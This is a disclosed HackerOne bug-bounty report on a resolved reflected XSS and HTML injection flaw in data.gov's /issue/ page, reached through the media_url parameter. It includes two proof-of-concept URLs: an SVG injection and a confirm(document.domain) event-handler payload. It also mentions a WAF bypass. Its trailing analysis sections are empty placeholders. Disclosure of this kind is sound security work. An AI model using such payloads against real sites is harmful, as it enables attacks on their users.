---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '263226'
original_report_id: '263226'
title: HTML injection (with XSS possible) on the https://www.data.gov/issue/ using
  media_url attribute
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: gsa_bbp
created_at: '2017-08-25T13:33:29.074Z'
disclosed_at: '2017-09-15T13:38:30.757Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 38
asset_identifier: www.data.gov
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# HTML injection (with XSS possible) on the https://www.data.gov/issue/ using media_url attribute

## Metadata

- HackerOne Report ID: 263226
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: gsa_bbp
- Disclosed At: 2017-09-15T13:38:30.757Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

##Description
Hello. I discovered Cross-Site scripting issue on the https://www.data.gov/issue/ endpoint.

##Akamai WAF and bypass
At the srart i was not able to do the XSS due to Akamai Waf XSS filters, but later, i was able to bypass it.

##POC (HTML injection)
https://www.data.gov/issue/?media_url=catalog.data.gov/dataset/consumer-complaint-database%22%3E%3Csvg%20height=%22100%22%20width=%22100%22%3E%20%3Ccircle%20cx=%2250%22%20cy=%2250%22%20r=%2240%22%20stroke=%22black%22%20stroke-width=%223%22%20fill=%22red%22%20/%3E%20%3C/svg%3E
{F215755}

##POC (Reflected XSS)
Use this link in the Mozilla Firefox
https://www.data.gov/issue/?media_url=catalog.data.gov/dataset/consumer-complaint-database%22%3E%3C/div%3E%3C/div%3E%3Cbrute%20onbeforescriptexecute=%27confirm(document.domain)%27%3E
{F215768}

##Suggested fix
Sanitize all input fields on this page.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
